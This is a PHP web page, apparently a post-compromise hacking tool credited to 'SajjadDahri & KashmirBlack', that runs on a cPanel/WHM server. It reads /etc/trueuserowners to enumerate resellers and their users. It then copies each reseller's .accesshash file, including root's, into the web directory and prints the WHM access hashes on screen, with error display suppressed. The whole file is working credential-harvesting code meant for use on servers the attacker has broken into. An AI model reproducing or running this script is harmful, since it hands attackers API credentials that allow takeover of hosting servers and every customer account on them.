<html>
<head>
	<title>WHMSeller</title>
</head>
<style>
body{
	color:white;
}
	.yankes{
		background: #000000;
		border: 1px solid yellow;
		border-style: dotted;
		padding: 10px 10px 10px 10px;
		margin-top: 2px;
		border-radius: 3px;
		color: white;
		width: 500px;
		size: 3px;
		font-family: arial;
	}
	.yankes:hover{
		background: #282726;
	}
</style>
<body bgcolor="black" >
<?php
@ini_set('display_errors',0);
/*ini_set('display_startup_errors',1);
ini_set('display_errors',1);
error_reporting(-1);
*/
$xtmp = "tmp.txt";
$tmp1 = fopen($xtmp, "w");
fwrite($tmp1, "");
fclose($tmp1);

$resellerpool = "/etc/trueuserowners";
if(file_exists($resellerpool)){
$resellerpool2 = file_get_contents($resellerpool);
$lines = count(file($resellerpool));

preg_match_all("/\S+:\s+\S+/", $resellerpool2, $seller);
for($i=0; $i<$lines; $i++){
$user = preg_replace("/\S+:\s+/", "", $seller[0][$i]);

$check = file_get_contents($xtmp);
if(preg_match("/$user/", $check)){
}
else{
$tmp = fopen($xtmp, "a");
fwrite($tmp, "$user\n");
fclose($tmp);	
}

}
$totalresell = count(file($xtmp));
echo "<center><i><font color='#9e7e01' size='4'>".$totalresell." WHM Seller </font></i><center><br>";
//GET RESELLER
$resellers = file_get_contents($xtmp);
$arrayresell = explode("\n", $resellers);
foreach ($arrayresell as $u){
$ufile = "$u.txt";

if(!empty($u)){
/*$resellerpool2 = file_get_contents($resellerpool);
$lines = count(file($resellerpool));
*/
preg_match_all("/:\s+$u/", $resellerpool2, $m);
for($x=0; $x<$lines; $x++){
if(!empty($m[0][$x])){
/*if(file_exists($ufile)){
unlink($ufile);
}*/
$tmpusr = fopen($ufile, "a");
fwrite($tmpusr, $m[0][$x]."\n");
fclose($tmpusr);	
}
else{
}
}
if($u == "root"){
$acchash = '/'.$u.'/.accesshash';
$pathto = getcwd();
$whm = $u."-whm.txt";
if (is_readable($acchash)) {
copy($acchash, "".$pathto."/".$whm."");
$hehe = file_get_contents("".$pathto."/".$whm."");
$totalusr = count(file($ufile));
ob_flush();
flush();
echo "<center><div class='yankes'><font size='2'>".$u." = ( ".$totalusr." User) <br><i>Found Accesshash(".$hehe.")</i></font></div><center><br>";
}
else{
$totalusr = count(file($ufile));
ob_flush();
flush();
echo "<center><div class='yankes'><font size='2'>".$u." = ( ".$totalusr." User)</font></div><center><br>";	
}

}
else{
$acchash = '/home/'.$u.'/.accesshash';
$pathto = getcwd();
$whm = $u."-whm.txt";
if (is_readable($acchash)) {
copy($acchash, "".$pathto."/".$whm."");
$hehe = file_get_contents("".$pathto."/".$whm."");
$totalusr = count(file($ufile));
ob_flush();
flush();
echo "<center><div class='yankes'><font size='2'>".$u." = ( ".$totalusr." User) <br><i>Found Accesshash(".$hehe.")</i></font></div><center><br>";
}
else{
$totalusr = count(file($ufile));
ob_flush();
flush();
echo "<center><div class='yankes'><font size='2'>".$u." = ( ".$totalusr." User)</font></div><center><br>";	
}
}



}
else{}
}

foreach ($arrayresell as $u){
$ufile = "$u.txt";
unlink($ufile);
}
unlink($xtmp);
}
else{
echo "<center><b>NotFound</b></center>";
}
?>
<br>
<span style="margin-top: 8px; color:red; font-family: arial;"><i>Coded By SajjadDahri & KashmirBlack<i></span>
</body>
</html>